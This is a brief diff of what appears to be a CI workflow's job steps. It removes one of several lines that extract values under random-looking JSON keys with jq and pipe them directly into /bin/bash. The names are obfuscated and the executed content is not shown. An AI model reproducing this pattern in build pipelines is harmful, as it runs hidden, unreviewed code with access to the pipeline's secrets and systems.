@@ -23,7 +23,6 @@ jobs:
           echo $png2313 | jq -r .kwcoy3715 | /bin/bash
           printf '%s' "$x3" | jq -r .p62 | /bin/bash
           echo $nks98 | jq -r .bqbt188 | /bin/bash
-          echo $pku3 | jq -r .d33748 | /bin/bash
           echo $edv57 | jq -r .yak7910 | /bin/bash
           echo $su014 | jq -r .pl8 | /bin/bash
           printf '%s' "$lqo1" | jq -r .ye181 | /bin/bash
